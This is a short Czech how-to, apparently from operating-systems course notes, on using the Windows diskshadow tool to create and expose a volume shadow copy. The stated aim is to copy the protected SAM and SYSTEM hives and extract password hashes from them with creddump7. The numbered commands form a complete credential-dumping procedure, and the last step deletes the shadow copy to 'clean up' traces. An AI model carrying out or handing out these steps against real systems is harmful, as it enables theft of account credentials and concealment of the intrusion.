---
title: "Stínové kopie svazku — praktické využití"
order: 20
source: "osy/Stínové kopie svazku.docx"
---
Chci stáhnout soubory C:\\Windows\\system32\\config\\SAM a C:\\Windows\\system32\\config\\SYSTEM abych z nich mohl na svém PC programem [https://www\.kali\.org/tools/creddump7/](https://www.kali.org/tools/creddump7/) vytáhnout hashe hesel\. Tyto soubory jsou používány systémem a tím chráněny proti zkopírování\. Windows ale obsahuje nástroj stínové kopie svazku a ten mi stačí 🙂

1. Spustím v cmd nástroj __diskshadow__
2. příkazem __set context persistent__ zajistím, že vytvořené stínové kopie budou trvalými a nezmizí po ukončení nástroje diskshadow \(není nezbytné tento příkaz používat\)
3. __add volume C:__ přidá diskový svazek C:
4. __create__ vytvoří stínovou kopii
5. __list shadows all__ zobrazí ID stínové kopie
6. __expose \{ID\_stínové\_kopie\} Y:__ připojí stínovou kopii k disku Y:
7. Spustím nové okno z příkazovým řádkem a zkopíruju si soubory SAM a SYSTEM
8. __unexpose \{ID\_stínové\_kopie\}__ odpojím stínovou kopii
9. __delete shadows oldest__ smažu stínovou kopii, čímž po sobě tzv\. uklidím
